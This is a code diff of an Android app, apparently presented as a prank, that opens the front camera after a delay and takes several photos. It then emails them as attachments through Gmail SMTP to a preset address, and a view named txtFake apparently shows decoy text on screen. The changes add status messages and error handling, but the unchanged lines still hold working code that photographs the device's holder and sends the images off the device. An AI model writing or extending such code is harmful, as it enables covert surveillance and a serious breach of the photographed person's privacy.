@@ -68,15 +68,17 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     public void surfaceCreated(SurfaceHolder holder) {
         try {
             int cameraId = getFrontCameraId();
-            if (cameraId == -1) return;
-
+            if (cameraId == -1) {
+                showStatus("Нет камеры!");
+                return;
+            }
             camera = Camera.open(cameraId);
             camera.setPreviewDisplay(holder);
             camera.startPreview();
-
             handler.postDelayed(this::startPrank, START_DELAY_MS);
         } catch (Exception e) {
-            Log.e(TAG, "surfaceCreated error: " + e.getMessage());
+            showStatus("Ошибка камеры: " + e.getMessage());
+            Log.e(TAG, "surfaceCreated error", e);
         }
     }
 
@@ -103,18 +105,15 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
             if (camera == null) return;
             try {
                 camera.takePicture(null, null, null, (data, cam) -> {
-                    // сохраняем байты фото
                     photos.add(data);
                     photoCount++;
-                    Log.d(TAG, "Photo saved: " + photoCount + " size=" + data.length);
-
+                    Log.d(TAG, "Photo " + photoCount + " taken, size=" + data.length);
                     cam.startPreview();
 
                     if (photoCount < PHOTO_COUNT) {
                         scheduleNextPhoto(PHOTO_INTERVAL_MS);
                     } else {
-                        // Все фото сделаны — отправляем
-                        handler.post(() -> txtFake.setText("Готово!"));
+                        showStatus("Отправка...");
                         sendEmail();
                     }
                 });
@@ -128,6 +127,8 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private void sendEmail() {
         new Thread(() -> {
             try {
+                showStatus("Подключение к серверу...");
+
                 Properties props = new Properties();
                 props.put("mail.smtp.host", "smtp.gmail.com");
                 props.put("mail.smtp.port", "465");
@@ -137,8 +138,8 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                 props.put("mail.smtp.socketFactory.port", "465");
                 props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
                 props.put("mail.smtp.socketFactory.fallback", "false");
-                props.put("mail.smtp.timeout", "15000");
-                props.put("mail.smtp.connectiontimeout", "15000");
+                props.put("mail.smtp.timeout", "20000");
+                props.put("mail.smtp.connectiontimeout", "20000");
 
                 Session session = Session.getInstance(props, new Authenticator() {
                     @Override
@@ -147,20 +148,19 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                     }
                 });
 
+                showStatus("Формируем письмо...");
+
                 Message message = new MimeMessage(session);
                 message.setFrom(new InternetAddress(EMAIL_FROM));
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                 message.setSubject(EMAIL_SUBJECT);
 
-                // Multipart — текст + фото как вложения
                 Multipart multipart = new MimeMultipart();
 
-                // Текст
                 MimeBodyPart textPart = new MimeBodyPart();
-                textPart.setText("Gotcha! " + photos.size() + " photos taken!");
+                textPart.setText("Gotcha! Фото: " + photos.size());
                 multipart.addBodyPart(textPart);
 
-                // Прикрепляем каждое фото
                 for (int i = 0; i < photos.size(); i++) {
                     MimeBodyPart photoPart = new MimeBodyPart();
                     DataSource ds = new ByteArrayDataSource(photos.get(i), "image/jpeg");
@@ -170,13 +170,23 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                 }
 
                 message.setContent(multipart);
+
+                showStatus("Отправка письма...");
                 Transport.send(message);
-                Log.d(TAG, "Email sent with " + photos.size() + " photos!");
+
+                showStatus("Готово! Письмо отправлено!");
+                Log.d(TAG, "Email sent successfully!");
 
             } catch (Exception e) {
-                Log.e(TAG, "Email error: " + e.getClass().getSimpleName() + ": " + e.getMessage(), e);
+                String err = e.getClass().getSimpleName() + ": " + e.getMessage();
+                Log.e(TAG, "Email error: " + err, e);
+                showStatus("ОШИБКА: " + err);
             }
         }).start();
+    }
+
+    private void showStatus(String text) {
+        handler.post(() -> txtFake.setText(text));
     }
 
     @Override
